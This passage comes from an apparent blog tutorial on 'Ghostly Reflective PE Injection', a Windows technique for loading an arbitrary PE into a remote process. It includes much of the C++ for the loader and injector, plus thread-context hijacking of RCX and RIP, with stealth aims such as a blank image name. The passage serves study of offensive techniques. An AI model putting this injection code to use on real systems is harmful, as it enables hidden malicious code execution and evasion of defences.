data-selectable-paragraph=""><strong class="no hm">In short, Ghostly Hollowing can map a fully functional, ready to be invoked PE inside a process. It just cannot take care of relocations for an already running process.</strong></p><h3 id="afb3" class="pi ol hl bg om pj pk ef oq pl pm eh ou nx pn po pp ob pq pr ps of pt pu pv pw bl" data-selectable-paragraph="">Reflective DLL injections — pros and cons</h3><p id="bffd" class="pw-post-body-paragraph nm nn hl no b np px nr ns nt py nv nw nx pz nz oa ob qa od oe of qb oh oi oj he bl" data-selectable-paragraph="">Reflective DLL injection involves injecting a loader DLL into a remote process. This loader DLL exports a position-independent function that loads the DLL itself (resolving imports, relocations, assigning correct memory permissions, etc). Since it’s position independent, it won’t fail before the DLL is actually loaded. After this, the DLL’s <code class="de ql qm qn qo b">DllMain</code> entrypoint is called.</p><p id="888a" class="pw-post-body-paragraph nm nn hl no b np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj he bl" data-selectable-paragraph="">In addition, since the loader DLL loads itself, you are avoiding too many inter-process read/writes for the loading. The DLL loader can locally load itself, can’t it?</p><p id="6f08" class="pw-post-body-paragraph nm nn hl no b np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj he bl" data-selectable-paragraph=""><strong class="no hm">In short, Reflective DLL injection can load any DLL in a remote process, but only if the DLL exports a position-independent function that can load itself.</strong></p><h3 id="aac0" class="pi ol hl bg om pj pk ef oq pl pm eh ou nx pn po pp ob pq pr ps of pt pu pv pw bl" data-selectable-paragraph="">Combining the two — Ghostly Reflective PE Injection</h3><p id="ae4b" class="pw-post-body-paragraph nm nn hl no b np px nr ns nt py nv nw nx pz nz oa ob qa od oe of qb oh oi oj he bl" data-selectable-paragraph="">We can combine the above two techniques to cover each others’ cons. Here’s the idea — we split the Reflective DLL injection’s Loader DLL into three parts — <strong class="no hm">Injector</strong>, <strong class="no hm">Loader</strong> &amp; actual <strong class="no hm">Target PE</strong> (the one we actually aim to load).</p><ol class=""><li id="c7c1" class="nm nn hl no b np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj qp qd qe bl" data-selectable-paragraph="">Using Ghostly Hollowing, the <strong class="no hm">Injector</strong> injects a position-independent <strong class="no hm">Loader</strong> DLL in a remote process, and executes it. The need for relocations is negated. All necessary functions are resolved at runtime. Due to how Ghostly Hollowing works, this mapped DLL would show up under a blank image name.</li><li id="ec23" class="nm nn hl no b np qg nr ns nt qh nv nw nx qi nz oa ob qj od oe of qk oh oi oj qp qd qe bl" data-selectable-paragraph="">A Reflective DLL loads itself (the entire payload is already available) as the Target PE. Taking inspiration from it, I instead wrote my Loader to read the <strong class="no hm">Target PE</strong> from the system page file directly (you can make it read from any source).</li></ol><p id="df4b" class="pw-post-body-paragraph nm nn hl no b np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj he bl" data-selectable-paragraph=""><strong class="no hm">The Loader &amp; Target PE are now decoupled! The loader can now locally load whatever PE it wants.</strong></p><h3 id="26b6" class="pi ol hl bg om pj pk ef oq pl pm eh ou nx pn po pp ob pq pr ps of pt pu pv pw bl" data-selectable-paragraph="">The outlining steps</h3><figure class="qr qs qt qu qv nc mu mv paragraph-image"><div role="button" tabindex="0" class="nd ne fr nf bi ng"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="mu mv qq"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ybnKtYaIWCPiLMNwQS78gQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*ybnKtYaIWCPiLMNwQS78gQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*ybnKtYaIWCPiLMNwQS78gQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*ybnKtYaIWCPiLMNwQS78gQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*ybnKtYaIWCPiLMNwQS78gQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ybnKtYaIWCPiLMNwQS78gQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ybnKtYaIWCPiLMNwQS78gQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*ybnKtYaIWCPiLMNwQS78gQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*ybnKtYaIWCPiLMNwQS78gQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*ybnKtYaIWCPiLMNwQS78gQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*ybnKtYaIWCPiLMNwQS78gQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*ybnKtYaIWCPiLMNwQS78gQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*ybnKtYaIWCPiLMNwQS78gQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*ybnKtYaIWCPiLMNwQS78gQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mb nh c" width="700" height="346" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*ybnKtYaIWCPiLMNwQS78gQ.png"></picture></div></div><figcaption class="ni fm nj mu mv nk nl bg b bh ab eb" data-selectable-paragraph="">Click to enlarge</figcaption></figure><ol class=""><li id="96ef" class="nm nn hl no b np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj qp qd qe bl" data-selectable-paragraph="">With Ghostly Hollowing, map the <strong class="no hm">Loader DLL</strong> into remote process.</li><li id="1c7b" class="nm nn hl no b np qg nr ns nt qh nv nw nx qi nz oa ob qj od oe of qk oh oi oj qp qd qe bl" data-selectable-paragraph="">Create a new thread in remote process to invoke <strong class="no hm">Loader DLL</strong>’s exported loading function (position independent). I name it <code class="de ql qm qn qo b"><strong class="no hm">Load()</strong></code> .</li><li id="0d99" class="nm nn hl no b np qg nr ns nt qh nv nw nx qi nz oa ob qj od oe of qk oh oi oj qp qd qe bl" data-selectable-paragraph="">This loading function fetches the <strong class="no hm">Target PE</strong> from system page file.</li><li id="37de" class="nm nn hl no b np qg nr ns nt qh nv nw nx qi nz oa ob qj od oe of qk oh oi oj qp qd qe bl" data-selectable-paragraph="">Fetched <strong class="no hm">Target PE</strong> is then locally loaded and executed.</li></ol><h2 id="1999" class="ok ol hl bg om on oo op oq or os ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph bl" data-selectable-paragraph="">Writing the Loader DLL</h2><h3 id="dbf3" class="pi ol hl bg om pj pk ef oq pl pm eh ou nx pn po pp ob pq pr ps of pt pu pv pw bl" data-selectable-paragraph="">Requirements</h3><p id="3745" class="pw-post-body-paragraph nm nn hl no b np px nr ns nt py nv nw nx pz nz oa ob qa od oe of qb oh oi oj he bl" data-selectable-paragraph="">Let’s start with the Loader DLL. Here’s the requirements —</p><ol class=""><li id="13ed" class="nm nn hl no b np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj qp qd qe bl" data-selectable-paragraph=""><strong class="no hm">Must be position-independent code: </strong>All necessary functions must be resolved at runtime. Since the Loader can be injected into any process, it must only rely on <code class="de ql qm qn qo b">ntdll.dll</code> and <code class="de ql qm qn qo b">kernel32.dll</code> (sparingly). Every other functionality must be custom-implemented. In addition, no global variables can be used, because global variables are referenced by their offsets, and we do not have relocations yet.</li><li id="fb27" class="nm nn hl no b np qg nr ns nt qh nv nw nx qi nz oa ob qj od oe of qk oh oi oj qp qd qe bl" data-selectable-paragraph=""><strong class="no hm">Must fetch the Target PE from system page file:</strong> Using NT apis, it is possible to open a <a class="ah qf" href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views" rel="noopener ugc nofollow" target="_blank">named Section</a> and read the Target PE contents from it.</li><li id="3149" class="nm nn hl no b np qg nr ns nt qh nv nw nx qi nz oa ob qj od oe of qk oh oi oj qp qd qe bl" data-selectable-paragraph=""><strong class="no hm">Must locally load Target PE:</strong> Now that the Target PE contents are fetched in memory, it must be loaded and its entrypoint executed. I’ll be reusing my previous <a class="ah qf" rel="noopener" href="https://captain-woof.medium.com/how-to-write-a-local-pe-loader-from-scratch-for-educational-purposes-30e10cd88abc" data-discover="true">Local PE loader</a> code.</li></ol><h3 id="40ee" class="pi ol hl bg om pj pk ef oq pl pm eh ou nx pn po pp ob pq pr ps of pt pu pv pw bl" data-selectable-paragraph="">Code</h3><pre class="qr qs qt qu qv qw qo qx bq qy bc bl"><span id="5db0" class="qz ol hl qo b bh ra rb m rc rd" data-selectable-paragraph=""><span class="hljs-comment">/*<br>---------------------------------------------------------------------------------------------------<br>This function is position independent, and loads the passed DLL content as a DLL<br><br>sectionName: UTF16-LE name of the Section from which to source the DLL contents<br>*/</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Load</span><span class="hljs-params">(LPVOID sectionName)</span> </span>{<br> <span class="hljs-comment">// Initialise variables</span><br> LPVOID pDllContents = <span class="hljs-literal">NULL</span>;<br> SIZE_T dllContentsSize = <span class="hljs-number">0</span>;<br> DWORD ntStatus = <span class="hljs-number">0</span>;<br> HMODULE hNtdll = <span class="hljs-literal">NULL</span>;<br> LPVOID pDllImage = <span class="hljs-literal">NULL</span>;<br> DWORD entrypointOffset = <span class="hljs-number">0</span>;<br><br> <span class="hljs-comment">// Resolve necessary functions</span><br> WINFUNC winFunc;<br> <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">ResolveNecessaryFunctions</span>(&amp;winFunc, &amp;hNtdll)) <span class="hljs-keyword">return</span>;<br><br> <span class="hljs-comment">// Read DLL from Section</span><br><br> <span class="hljs-comment">//// Open section handle</span><br> HANDLE hSectionDll = <span class="hljs-literal">NULL</span>;<br> OBJECT_ATTRIBUTES dllSectionObjectAttributes{};<br> <span class="hljs-built_in">RtlZeroMemoryCustom</span>(&amp;dllSectionObjectAttributes, <span class="hljs-built_in">sizeof</span>(OBJECT_ATTRIBUTES));<br><br> UNICODE_STRING sectionNameUnicodeString{};<br> DWORD sectionNameLen = <span class="hljs-built_in">StringLenW</span>((PWCHAR)sectionName);<br><br> sectionNameUnicodeString.Buffer = (PWSTR)sectionName;<br> sectionNameUnicodeString.MaximumLength = sectionNameLen * <span class="hljs-built_in">sizeof</span>(WCHAR);<br> sectionNameUnicodeString.Length = sectionNameLen * <span class="hljs-built_in">sizeof</span>(WCHAR);<br><br> <span class="hljs-built_in">InitializeObjectAttributes</span>(<br>  &amp;dllSectionObjectAttributes,<br>  &amp;sectionNameUnicodeString,<br>  OBJ_CASE_INSENSITIVE,<br>  <span class="hljs-literal">NULL</span>,<br>  <span class="hljs-literal">NULL</span><br> );<br><br> ntStatus = winFunc.<span class="hljs-built_in">pNtOpenSection</span>(<br>  &amp;hSectionDll,<br>  SECTION_MAP_READ | SECTION_MAP_WRITE,<br>  &amp;dllSectionObjectAttributes<br> );<br> <span class="hljs-keyword">if</span> (hSectionDll == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">goto</span> CLEANUP;<br><br> <span class="hljs-comment">//// Map view of section into local process</span><br> ntStatus = winFunc.<span class="hljs-built_in">pNtMapViewOfSection</span>(<br>  hSectionDll,<br>  (HANDLE)<span class="hljs-number">-1</span>,<br>  &amp;pDllContents,<br>  <span class="hljs-literal">NULL</span>,<br>  <span class="hljs-literal">NULL</span>,<br>  <span class="hljs-literal">NULL</span>,<br>  &amp;dllContentsSize,<br>  SECTION_INHERIT::ViewUnmap,<br>  <span class="hljs-literal">NULL</span>,<br>  PAGE_READWRITE<br> );<br> <span class="hljs-keyword">if</span> (dllContentsSize == <span class="hljs-number">0</span> || pDllContents == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">goto</span> CLEANUP;<br><br> <span class="hljs-comment">// Decrypt DLL and restore signatures TODO</span><br><br> <span class="hljs-comment">// Load DLL</span><br> <span class="hljs-built_in">LoadDll</span>(&amp;winFunc, hNtdll, pDllContents, &amp;pDllImage, &amp;entrypointOffset);<br> <span class="hljs-keyword">if</span> (pDllImage == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">goto</span> CLEANUP;<br><br> <span class="hljs-comment">// Remove raw DLL contents</span><br> <span class="hljs-keyword">if</span> (pDllContents != <span class="hljs-literal">NULL</span>)<br>  winFunc.<span class="hljs-built_in">pNtUnmapViewOfSection</span>(<br>   (HANDLE)<span class="hljs-number">-1</span>,<br>   pDllContents<br>  );<br> <span class="hljs-keyword">if</span> (hSectionDll != <span class="hljs-literal">NULL</span>)<br>  winFunc.<span class="hljs-built_in">pNtClose</span>(hSectionDll);<br><br> <span class="hljs-comment">// Jump to DLL's entrypoint</span><br> <span class="hljs-built_in">JumpToEntry</span>(&amp;winFunc, entrypointOffset, pDllImage);<br><br> <span class="hljs-comment">// Cleanup</span><br>CLEANUP:<br> <span class="hljs-comment">// Cleanup in-mem DLL buffer</span><br> <span class="hljs-keyword">if</span> (pDllImage != <span class="hljs-literal">NULL</span>)<br>  winFunc.<span class="hljs-built_in">pNtFreeVirtualMemory</span>(<br>   (HANDLE)<span class="hljs-number">-1</span>,<br>   &amp;pDllImage,<br>   <span class="hljs-number">0</span>,<br>   MEM_RELEASE<br>  );<br><br> <span class="hljs-comment">// Exit current thread</span><br> winFunc.<span class="hljs-built_in">pNtTerminateThread</span>((HANDLE)<span class="hljs-literal">NULL</span>, (NTSTATUS)<span class="hljs-number">0</span>);<br>}</span></pre><p id="dee4" class="pw-post-body-paragraph nm nn hl no b np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj he bl" data-selectable-paragraph="">Above is the Loader DLL’s exported <code class="de ql qm qn qo b">Load(LPVOID sectionName)</code> function, which accepts a section name, and reads the Target PE contents from it.</p><div class="vw ut vx vy ac r cv"><div class="vz wa wb wc wd m fm"><h2 class="we b wf wg wh wi wj">Get Sohail Saha’s stories in&nbsp;your&nbsp;inbox</h2></div><div class="cs m fm"><p class="bg b bh ab eb">Join Medium for free to get updates from&nbsp;this&nbsp;writer.</p></div><div class="wn tc wo wp tb wq ac"><span class="bg b bh ab bl"><div class="wr ac cv"><div class="ac wr fj fi bq ws wt de lp wu wv ww wx wy wz xa"><input class="xb al aj an xc xd gd lb bm xe bi" placeholder="Enter your email" type="text" value=""></div></div></span><div class="i l ts cb"><div class="wk wl wm"><button class="bg b bh ab xf sh xg xh xi xj vd fc fd xk xl xm fh fi fj fk bn fl fm">Subscribe</button></div></div><div class="bi k j e"><button class="bg b bh ab xf sh xg xh xi xj vd fc fd xk xl xm fh bi fi fj fk bn fl fm">Subscribe</button></div></div><div class="rv m"><div id="g-recaptcha"></div></div></div><p id="97c6" class="pw-post-body-paragraph nm nn hl no b np nr ns nt nv nw nx nz oa ob od oe of oh oi vy oj he bl" data-selectable-paragraph="">The <code class="de ql qm qn qo b">LoadDll()</code> and <code class="de ql qm qn qo b">JumpToEntry()</code> are the same as my local PE loader. With the Target PE contents, you can now parse it, load it, and jump to its calculated entrypoint.</p><p id="b31d" class="pw-post-body-paragraph nm nn hl no b np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj he bl" data-selectable-paragraph="">It is necessary to call <code class="de ql qm qn qo b">NtTerminateThread</code> manually. If not done, <code class="de ql qm qn qo b">return</code> will expect a pushed RIP on stack, which we won’t have, because we will have jumped directly to <code class="de ql qm qn qo b">Load</code> .</p><p id="4baa" class="pw-post-body-paragraph nm nn hl no b np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj he bl" data-selectable-paragraph="">We must also remember to clean up after ourselves — closing all open handles, unmapping all mapped views, etc.</p><h2 id="7ddc" class="ok ol hl bg om on oo op oq or os ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph bl" data-selectable-paragraph="">Writing the Injector</h2><p id="703f" class="pw-post-body-paragraph nm nn hl no b np px nr ns nt py nv nw nx pz nz oa ob qa od oe of qb oh oi oj he bl" data-selectable-paragraph="">At this stage, our Loader is ready. The injector needs to inject it into the remote process, and “call” its exported function <code class="de ql qm qn qo b">Load(LPVOID sectionName)</code> with fastcall.</p><h3 id="7a9f" class="pi ol hl bg om pj pk ef oq pl pm eh ou nx pn po pp ob pq pr ps of pt pu pv pw bl" data-selectable-paragraph="">Creating a Named Section for Target PE</h3><pre class="qr qs qt qu qv qw qo qx bq qy bc bl"><span id="04a5" class="qz ol hl qo b bh ra rb m rc rd" data-selectable-paragraph=""><span class="hljs-comment">/*<br>-------------------------------------------------------------------------------------------------------<br>Function to create a named section for Target PE<br>*/</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreateNamedSectionForTargetPE</span><span class="hljs-params">(<span class="hljs-type">bool</span> injectLocal, IN PWINFUNC pWinFunc, IN LPVOID pDllContents, IN DWORD dllContentsSize, IN PHANDLE phFileMapping, IN OUT PWCHAR targetPESectionName, IN HANDLE hTargetProcess)</span> </span>{<br> <span class="hljs-comment">// Initialise</span><br> <span class="hljs-type">bool</span> isSuccess = <span class="hljs-literal">false</span>;<br> LPVOID pDllContentsLocalMapped = <span class="hljs-literal">NULL</span>;<br> ULONG objectNameLen = <span class="hljs-number">0</span>;<br> POBJECT_NAME_INFORMATION pObjectNameInfo = <span class="hljs-literal">NULL</span>;<br><br> <span class="hljs-comment">// Create section backed by system page memory</span><br> SECURITY_ATTRIBUTES fileMappingSecurityAttr{};<br> fileMappingSecurityAttr.bInheritHandle = TRUE;<br> fileMappingSecurityAttr.nLength = <span class="hljs-built_in">sizeof</span>(SECURITY_ATTRIBUTES);<br> *phFileMapping = <span class="hljs-built_in">CreateFileMappingW</span>(<br>  INVALID_HANDLE_VALUE,<br>  &amp;fileMappingSecurityAttr,<br>  PAGE_READWRITE,<br>  <span class="hljs-number">0</span>,<br>  dllContentsSize,<br>  targetPESectionName<br> );<br> <span class="hljs-keyword">if</span> (*phFileMapping == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">goto</span> CLEANUP;<br><br> <span class="hljs-comment">// Update section name to fully qualified</span><br> pWinFunc-&gt;<span class="hljs-built_in">pNTQueryObject</span>( <span class="hljs-comment">// It will fail first time because objectNameLen is 0</span><br>  *phFileMapping,<br>  (OBJECT_INFORMATION_CLASS)OBJECT_NAME_INFORMATION_CLASS,<br>  pObjectNameInfo,<br>  <span class="hljs-number">0</span>,<br>  &amp;objectNameLen<br> );<br> <span class="hljs-keyword">if</span> (objectNameLen != <span class="hljs-number">0</span>) {<br>  pObjectNameInfo = (POBJECT_NAME_INFORMATION)(<span class="hljs-built_in">HeapAlloc</span>(<br>   <span class="hljs-built_in">GetProcessHeap</span>(),<br>   HEAP_ZERO_MEMORY,<br>   objectNameLen<br>  ));<br>  <span class="hljs-keyword">if</span> (pObjectNameInfo != <span class="hljs-literal">NULL</span>) {<br>   pWinFunc-&gt;<span class="hljs-built_in">pNTQueryObject</span>(<br>    *phFileMapping,<br>    (OBJECT_INFORMATION_CLASS)OBJECT_NAME_INFORMATION_CLASS,<br>    pObjectNameInfo,<br>    objectNameLen,<br>    &amp;objectNameLen<br>   );<br><br>   <span class="hljs-keyword">if</span> (pObjectNameInfo-&gt;Name.Buffer != <span class="hljs-literal">NULL</span>) {<br>    <span class="hljs-built_in">CopyBuffer</span>((PBYTE)targetPESectionName, (PBYTE)(pObjectNameInfo-&gt;Name.Buffer), (pObjectNameInfo-&gt;Name.MaximumLength));<br>   }<br>  }<br> }<br> <span class="hljs-built_in">wprintf</span>(<span class="hljs-string">L"Named section created for Target DLL: \"%s\"\n"</span>, targetPESectionName);<br><br> <span class="hljs-comment">// Map section to current process and write Target PE contents to it</span><br> pDllContentsLocalMapped = <span class="hljs-built_in">MapViewOfFile</span>(<br>  *phFileMapping,<br>  FILE_MAP_READ | FILE_MAP_WRITE,<br>  <span class="hljs-number">0</span>,<br>  <span class="hljs-number">0</span>,<br>  <span class="hljs-number">0</span><br> );<br> <span class="hljs-keyword">if</span> (pDllContentsLocalMapped == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">goto</span> CLEANUP;<br> <span class="hljs-built_in">CopyBuffer</span>((PBYTE)pDllContentsLocalMapped, (PBYTE)pDllContents, dllContentsSize); <span class="hljs-comment">// TODO encrypt DLL contents</span><br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d bytes target DLL payload written to named section (local mapped 0x%p)\n"</span>, dllContentsSize, pDllContentsLocalMapped);<br><br> <span class="hljs-comment">// Cleanup</span><br>CLEANUP:<br> <span class="hljs-keyword">if</span> (pDllContentsLocalMapped != <span class="hljs-literal">NULL</span>)<br>  <span class="hljs-built_in">UnmapViewOfFile</span>(pDllContentsLocalMapped);<br><br> <span class="hljs-keyword">if</span> (pObjectNameInfo != <span class="hljs-literal">NULL</span>)<br>  <span class="hljs-built_in">HeapFree</span>(<span class="hljs-built_in">GetProcessHeap</span>(), <span class="hljs-number">0</span>, pObjectNameInfo);<br>}</span></pre><p id="6092" class="pw-post-body-paragraph nm nn hl no b np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj he bl" data-selectable-paragraph="">Named sections can be session-specific or global, depending on the prefix used in the name. Even then, the actual section name ends up being prefixed with more stuff. It’s essential to get the fully qualified section name, because unlike Win32 APIs, NT APIs take only the full name. <code class="de ql qm qn qo b">NtQueryObject()</code> helps in retrieving this full name.</p><p id="0ff5" class="pw-post-body-paragraph nm nn hl no b np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj he bl" data-selectable-paragraph=""><code class="de ql qm qn qo b">CreateFileMappingW()</code> creates the named section, and <code class="de ql qm qn qo b">MapViewOfFile</code> maps it to the local process. Then it writes the raw Target PE content to this view, thus effectively preparing the named section for Loader.</p><h3 id="79e3" class="pi ol hl bg om pj pk ef oq pl pm eh ou nx pn po pp ob pq pr ps of pt pu pv pw bl" data-selectable-paragraph="">Creating a Ghost section for Loader DLL in remote process</h3><p id="4961" class="pw-post-body-paragraph nm nn hl no b np px nr ns nt py nv nw nx pz nz oa ob qa od oe of qb oh oi oj he bl" data-selectable-paragraph="">This is exactly the same as the Ghostly Hollowing technique, so I won’t be showing it here again. With this, the Loader DLL is loaded into remote process, with all correct page-protections.</p><h3 id="0c4d" class="pi ol hl bg om pj pk ef oq pl pm eh ou nx pn po pp ob pq pr ps of pt pu pv pw bl" data-selectable-paragraph="">Injecting Section Name for Target PE in remote process</h3><p id="2f91" class="pw-post-body-paragraph nm nn hl no b np px nr ns nt py nv nw nx pz nz oa ob qa od oe of qb oh oi oj he bl" data-selectable-paragraph="">The Loader DLL’s <code class="de ql qm qn qo b">Load(LPVOID sectionName)</code> function requires the address to the section name to use for fetching Target PE. This name must be first written at any address in the remote process, and that address must then be stored to pass to the <code class="de ql qm qn qo b">Load(LPVOID sectionName)</code> function.</p><pre class="qr qs qt qu qv qw qo qx bq qy bc bl"><span id="0c76" class="qz ol hl qo b bh ra rb m rc rd" data-selectable-paragraph=""><span class="hljs-comment">/*<br>-------------------------------------------------------------------------------------------------------<br>Function to map the name of the named section (containg target PE payload) to Target process<br>*/</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">InjectSectionNameForTargetPEContentsInTargetProcess</span><span class="hljs-params">(<span class="hljs-type">bool</span> injectLocal, IN HANDLE hTargetProcess, IN PWCHAR targetPESectionName, OUT PHANDLE phDllContentsSectionNameMappingTarget, OUT VOID **ppDllContentsSectionNameTarget)</span> </span>{<br> <span class="hljs-comment">// Create file mapping object</span><br> DWORD targetPESectionNameSize = (<span class="hljs-built_in">StringLenW</span>(targetPESectionName) + <span class="hljs-number">1</span>) * <span class="hljs-built_in">sizeof</span>(WCHAR);<br> *phDllContentsSectionNameMappingTarget = <span class="hljs-built_in">CreateFileMappingW</span>(<br>  INVALID_HANDLE_VALUE,<br>  <span class="hljs-literal">NULL</span>,<br>  PAGE_READWRITE | SEC_COMMIT,<br>  <span class="hljs-number">0</span>,<br>  targetPESectionNameSize,<br>  <span class="hljs-literal">NULL</span><br> );<br> <span class="hljs-keyword">if</span> (*phDllContentsSectionNameMappingTarget == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br> <span class="hljs-comment">// Map view to local process and write the section name</span><br> LPVOID targetPESectionNameLocal = <span class="hljs-built_in">MapViewOfFile</span>(<br>  *phDllContentsSectionNameMappingTarget,<br>  FILE_MAP_WRITE,<br>  <span class="hljs-number">0</span>,<br>  <span class="hljs-number">0</span>,<br>  <span class="hljs-number">0</span><br> );<br> <span class="hljs-keyword">if</span> (targetPESectionNameLocal == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br> <span class="hljs-built_in">CopyBuffer</span>((PBYTE)targetPESectionNameLocal, (PBYTE)targetPESectionName, targetPESectionNameSize);<br><br> <span class="hljs-comment">//Map section to target process</span><br> <span class="hljs-keyword">if</span> (injectLocal)<br>  *ppDllContentsSectionNameTarget = targetPESectionNameLocal;<br> <span class="hljs-keyword">else</span><br>  *ppDllContentsSectionNameTarget = <span class="hljs-built_in">MapViewOfFile3</span>(<br>   *phDllContentsSectionNameMappingTarget,<br>   hTargetProcess,<br>   <span class="hljs-literal">NULL</span>,<br>   <span class="hljs-number">0</span>,<br>   <span class="hljs-number">0</span>,<br>   <span class="hljs-number">0</span>,<br>   PAGE_READWRITE,<br>   <span class="hljs-literal">NULL</span>,<br>   <span class="hljs-number">0</span><br>  );<br><br> <span class="hljs-keyword">if</span> (*ppDllContentsSectionNameTarget == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"DLL contents section name mapped to target 0x%p\n"</span>, *ppDllContentsSectionNameTarget);<br> <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>}</span></pre><h3 id="d6c3" class="pi ol hl bg om pj pk ef oq pl pm eh ou nx pn po pp ob pq pr ps of pt pu pv pw bl" data-selectable-paragraph="">Invoking <code class="de ql qm qn qo b">Load()</code> in Loader</h3><p id="472f" class="pw-post-body-paragraph nm nn hl no b np px nr ns nt py nv nw nx pz nz oa ob qa od oe of qb oh oi oj he bl" data-selectable-paragraph="">Since <code class="de ql qm qn qo b">Load(LPVOID sectionName)</code> takes a fastcall, additional patching is needed to make sure a new thread can correctly call this. That is because thread entrypoints are called with stdcall. A stdcall would pass arguments on stack, but fastcall expects it in registers. Since <code class="de ql qm qn qo b">sectionName</code> is the first argument, <code class="de ql qm qn qo b">Load()</code> expects it in the RCX register. In other words, RCX must hold the address to the section name. We create a new suspended thread, and set its thread context to set this RCX value.</p><p id="c670" class="pw-post-body-paragraph nm nn hl no b np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj he bl" data-selectable-paragraph="">In addition to this, the RIP is patched to store <code class="de ql qm qn qo b">Load()</code> ‘s address. This is because new threads don’t start executing from their entrypoints directly; there’s some initialisation code before that.</p><pre class="qr qs qt qu qv qw qo qx bq qy bc bl"><span id="d55a" class="qz ol hl qo b bh ra rb m rc rd" data-selectable-paragraph=""><span class="hljs-comment">/*<br>-------------------------------------------------------------------------------------------------------<br>Invokes loader DLL<br>*/</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">InvokeLoaderDll</span><span class="hljs-params">(<span class="hljs-type">bool</span> injectLocal, IN PWINFUNC pWinFunc, IN PWCHAR targetPESectionNameAddress, IN HANDLE hTargetProcess, IN DWORD targetProcessId, IN LPVOID pLoaderDllContents, IN VOID** ppDllLoaderInTargetBaseAddress)</span> </span>{<br> <span class="hljs-comment">// Initialisation</span><br> ULONG processAllSize = <span class="hljs-number">0</span>;<br> PSYSTEM_PROCESS_INFORMATION pProcessAll = <span class="hljs-literal">NULL</span>;<br> PSYSTEM_PROCESS_INFORMATION pTargetProcessInfo = <span class="hljs-literal">NULL</span>;<br> PSYSTEM_THREAD_INFORMATION pTargetThreadInfo = <span class="hljs-literal">NULL</span>;<br> HANDLE hTargetThread = <span class="hljs-literal">NULL</span>;<br> PIMAGE_NT_HEADERS pNtHeader = <span class="hljs-literal">NULL</span>;<br> LPVOID dllLoaderInTargetAddressOfLoadFunction = <span class="hljs-literal">NULL</span>;<br> <span class="hljs-type">bool</span> isSuccess = <span class="hljs-literal">false</span>;<br><br> <span class="hljs-comment">// Find DLL loader's Load function offset</span><br> dllLoaderInTargetAddressOfLoadFunction = <span class="hljs-built_in">ADD_OFFSET_TO_POINTER</span>(*ppDllLoaderInTargetBaseAddress, <span class="hljs-built_in">GetProcAddressOffset</span>(pLoaderDllContents, (PCHAR)<span class="hljs-string">"Load"</span>));<br> <span class="hljs-keyword">if</span> 